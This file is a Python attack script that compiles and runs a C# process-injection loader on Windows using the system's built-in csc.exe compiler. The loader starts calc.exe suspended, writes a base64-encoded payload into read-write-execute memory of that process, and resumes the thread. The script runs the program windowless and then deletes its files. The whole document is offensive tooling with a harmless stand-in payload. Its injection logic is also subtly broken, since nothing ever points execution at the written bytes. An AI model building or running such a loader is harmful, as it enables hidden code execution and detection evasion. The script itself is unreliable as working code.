import os
import sys
import shutil
import base64
import subprocess
import glob

WORK_DIR     = r"C:\Temp\CSCExploit"
CALC_SRC     = r"C:\Windows\System32\calc.exe"
CSC_PATTERNS = [
    r"C:\Windows\Microsoft.NET\Framework\v*\csc.exe",
    r"C:\Windows\Microsoft.NET\Framework64\v*\csc.exe",
]

CS_FILE  = "Program.cs"
EXE_NAME = "Program.exe"


def detect_csc():
    candidates = []
    for pat in CSC_PATTERNS:
        candidates.extend(glob.glob(pat))
    if not candidates:
        return None
    candidates.sort(key=lambda p: list(map(int, os.path.basename(os.path.dirname(p))[1:].split('.'))))
    return candidates[-1]


def setup_environment():
    try:
        os.makedirs(WORK_DIR, exist_ok=True)
        return True
    except Exception:
        return False


def encode_calc():
    try:
        dst = os.path.join(WORK_DIR, "calc.exe")
        shutil.copy(CALC_SRC, dst)
        with open(dst, "rb") as f:
            data = f.read()
        return base64.b64encode(data).decode('ascii')
    except Exception:
        return None


def create_cs_file(b64):
    cs_code = f"""
using System;
using System.Runtime.InteropServices;

class Program
{{
    const uint CREATE_SUSPENDED      = 0x4;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_COMMIT             = 0x1000;

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct STARTUPINFO
    {{ 
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }}

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {{ 
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }}

    static void Main()
    {{
        string b64 = "{b64}";
        byte[] payload = Convert.FromBase64String(b64);

        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;

        if (!CreateProcess(
            null,
            "C:\\\\Windows\\\\System32\\\\calc.exe",
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            CREATE_SUSPENDED,
            IntPtr.Zero,
            null,
            ref si,
            out pi))
        {{
            return;
        }}

        IntPtr remoteAddr = VirtualAllocEx(
            pi.hProcess,
            IntPtr.Zero,
            (uint)payload.Length,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        UIntPtr bytesWritten;
        WriteProcessMemory(
            pi.hProcess,
            remoteAddr,
            payload,
            (uint)payload.Length,
            out bytesWritten);

        ResumeThread(pi.hThread);
    }}
}}
"""
    try:
        with open(os.path.join(WORK_DIR, CS_FILE), "w") as f:
            f.write(cs_code)
        return True
    except Exception:
        return False


def compile_and_run(csc_path):
    try:
        res = subprocess.run(
            [csc_path, "/nologo", "/target:exe", CS_FILE],
            cwd=WORK_DIR,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if res.returncode != 0:
            return False

        exe_path = os.path.join(WORK_DIR, EXE_NAME)
        subprocess.run(
            [exe_path],
            cwd=WORK_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except Exception:
        return False


def cleanup():
    for fname in ["calc.exe", CS_FILE, EXE_NAME]:
        try:
            os.remove(os.path.join(WORK_DIR, fname))
        except:
            pass


def main():
    if not setup_environment():
        sys.exit(1)

    csc = detect_csc()
    if not csc:
        sys.exit(1)

    b64 = encode_calc()
    if not b64:
        sys.exit(1)

    if not create_cs_file(b64):
        sys.exit(1)

    compile_and_run(csc)
    cleanup()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cleanup()
        sys.exit(0)
